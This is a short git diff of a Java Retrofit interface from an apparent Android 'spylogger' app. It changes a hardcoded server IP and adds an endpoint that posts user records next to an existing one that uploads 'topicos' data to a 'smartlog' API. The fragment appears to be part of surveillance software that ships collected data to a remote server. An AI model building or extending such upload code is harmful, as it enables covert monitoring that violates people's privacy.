@@ -1,6 +1,7 @@
 package com.gravatasufoca.spylogger.services;
 
 import com.gravatasufoca.spylogger.model.Topico;
+import com.gravatasufoca.spylogger.vos.UsuarioVO;
 
 import java.util.List;
 
@@ -14,9 +15,15 @@ import retrofit2.http.POST;
 
 public interface SendDataInterface {
 
-    String url="http://192.168.1.119/smartlog/api/v1/receber/";
+    String ip="172.24.35.147";
+//    String ip="192.168.1.119";
 
-    @POST(url+"topicos")
+    String apiUrl="http://"+ip+"/smartlog/api/v1/";
+
+    @POST(apiUrl+"receber/topicos")
     Call<Boolean> enviarTopicos(@Body List<Topico> topicos);
+
+    @POST(apiUrl+"usuario")
+    Call<UsuarioVO> inserirUsuario(@Body UsuarioVO usuarioVO);
 
 }
